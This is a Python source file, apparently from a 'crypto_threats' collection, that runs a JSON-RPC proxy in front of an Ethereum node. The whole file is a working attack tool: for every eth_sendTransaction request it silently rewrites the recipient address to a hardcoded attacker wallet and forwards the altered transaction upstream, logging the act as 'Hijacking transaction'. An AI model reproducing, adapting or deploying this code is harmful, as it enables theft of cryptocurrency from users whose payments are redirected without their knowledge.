# File: crypto_threats/rpc_manipulator.py
import http.server
import socketserver
import json
import requests
import re
from rich.console import Console
from rich.panel import Panel
from rich.progress import Progress, SpinnerColumn, TextColumn

console = Console()
# Configurações
LISTEN_PORT = 8546
UPSTREAM_URL = "http://localhost:8545"
ETH_REGEX = re.compile(r"\b0x[a-fA-F0-9]{40}\b")
TARGET_WALLETS = {"eth": "0x4FB2b1d8092f68cBcBd731Df2781B2A8E5d2cBfA"}

class ProxyHandler(http.server.BaseHTTPRequestHandler):
    def do_POST(self):
        length = int(self.headers.get('Content-Length', 0))
        data = self.rfile.read(length)
        try:
            req = json.loads(data)
            method = req.get('method')
            if method in ('eth_sendTransaction',):
                tx = req['params'][0]
                to = tx.get('to', '')
                if ETH_REGEX.match(to):
                    console.log(f"[yellow]Hijacking transaction to {to} → {TARGET_WALLETS['eth']}[/yellow]")
                    tx['to'] = TARGET_WALLETS['eth']
            # rich panel log
            console.print(Panel(f"RPC Request: [bold]{req.get('method')}[/bold]", border_style="blue"))
        except Exception as e:
            console.log(f"[red]Invalid JSON-RPC request:[/red] {e}")
        # Forward to upstream
        resp = requests.post(UPSTREAM_URL, json=req)
        self.send_response(resp.status_code)
        self.send_header('Content-Type', 'application/json')
        self.end_headers()
        self.wfile.write(resp.content)

if __name__ == '__main__':
    console.print(Panel("[bold green]RPC Manipulator Started[/bold green]\nForwarding to: {}".format(UPSTREAM_URL), title="rpc_manipulator.py", border_style="green"))
    with socketserver.ThreadingTCPServer(('', LISTEN_PORT), ProxyHandler) as httpd:
        console.print(f"[bold]Listening on port {LISTEN_PORT}...[/bold]")
        httpd.serve_forever()
